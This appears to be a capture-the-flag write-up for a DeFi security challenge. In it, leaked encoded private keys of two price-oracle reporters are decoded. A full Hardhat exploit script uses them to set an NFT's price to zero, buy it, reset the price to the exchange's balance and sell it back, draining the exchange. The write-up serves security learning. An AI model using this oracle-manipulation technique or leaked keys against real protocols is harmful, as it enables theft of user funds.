# Intro

While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.

Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

# Attack explanation

Our objective is to take all the ETH from the exchange.

It results that the received information are two private keys from two trusted price oracles. In order to beat the level, we need to:

1. Convert the HEX to UTF-8 and perform base64decode for the received keys.
2. Import the keys. As a result, we will be able to update the oracle price on our behalf.
3. Maniuplate price of both oracles so we can buy the DVNFT cheap.
4. Buy the DVNFT.
5. Manipulate price of both oracles so we can sell the DVNFT expensive.
6. Approve and sell the DVNFT draining the funds.

# Attack function

To drain the funds, we need to execute the following script:

```
it("Exploit", async function () {
    // Helper function for converting the data from Base64 format into a private key in hex format
    const leakToPrivateKey = (leak) => {
      const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(
        `utf8`
      );
      const hexKey = Buffer.from(base64, `base64`).toString(`utf8`);
      return hexKey;
    };

    // Leaked information to format
    const leakedInformation = [
      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34",
    ];

    // Get private keys
    const privateKey1 = leakToPrivateKey(leakedInformation[0]);
    const privateKey2 = leakToPrivateKey(leakedInformation[1]);

    // Import the oracle keys.
    const trustedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);
    const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);

    // Set DVNFT cheap
    await this.oracle.connect(trustedOracle1).postPrice("DVNFT", 0);
    await this.oracle.connect(trustedOracle2).postPrice("DVNFT", 0);

    // Buy DVNFT
    await this.exchange.connect(attacker).buyOne({ value: 1 });

    // Set DVNFT expensive
    await this.oracle
      .connect(trustedOracle1)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    await this.oracle
      .connect(trustedOracle2)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

    // Approve and sell DVNFT
    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
    await this.exchange.connect(attacker).sellOne(0);
  });
```
